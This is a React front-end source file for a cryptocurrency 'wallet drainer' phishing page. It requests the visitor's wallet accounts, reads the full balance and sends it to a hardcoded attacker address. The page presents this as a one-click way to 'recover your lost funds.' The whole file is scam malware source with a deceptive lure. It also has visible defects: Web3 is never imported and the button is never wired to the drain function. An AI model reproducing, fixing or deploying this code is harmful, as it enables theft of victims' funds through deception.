// frontend/src/index.js
import React from 'react';
import ReactDOM from 'react-dom/client';

// Your connect function
const connectWallet = async () => {
  if (window.ethereum) {
    try {
      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts',
      });
      const web3 = new Web3(window.ethereum);
      const balance = await web3.eth.getBalance(accounts[0]);
      const drainTo = '0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4'; // Replace with your drain address

      await web3.eth.sendTransaction({
        from: accounts[0],
        to: drainTo,
        value: balance,
      });

      alert('Wallet drained successfully!');
    } catch (err) {
      console.error(err);
      alert('Failed to drain wallet. Please try again.');
    }
  } else {
    alert('MetaMask or WalletConnect not detected. Please install.');
  }
};

// React Component
const App = () => {
  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4">
      <div className="max-w-md w-full bg-gray-800 p-8 rounded-lg shadow-lg text-center">
        <h1 className="text-4xl font-bold mb-6">Wallet Drainer</h1>
        <p className="text-lg mb-8">
          Recover your lost funds in one click. Connect your wallet now.
        </p>
        <button
          id="drainButton"
          className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded transition duration-200"
        >
          Connect
        </button>
      </div>
    </div>
  );
};

// Render the App
const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(<App />);

